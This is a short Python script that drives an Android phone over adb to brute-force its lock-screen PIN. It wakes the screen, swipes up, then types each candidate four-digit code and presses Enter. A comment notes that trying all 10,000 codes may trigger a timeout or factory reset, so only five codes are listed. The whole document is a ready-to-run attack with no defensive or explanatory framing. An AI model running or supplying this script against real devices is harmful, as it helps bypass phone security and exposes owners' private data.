
import os, math, time

os.system('adb shell input keyevent 26') # Turn ON screen
os.system('adb shell input swipe 200 500 200 0') # x1,y1, x2,y2

n = 10000
digits = int(math.log10(n))

# lst = range(n) # May cause Timeout error or Factory Reset
lst = [
    6783, 
    7926, 
    4982, 
    9567, 
    2589
] # Playing Safe

for i in lst:
    code = str(i).zfill(digits)
    print(code)
    time.sleep(2)

    os.system(f'adb shell input text {code}') # Input Passcode
    os.system('adb shell input keyevent 66') # Press OK
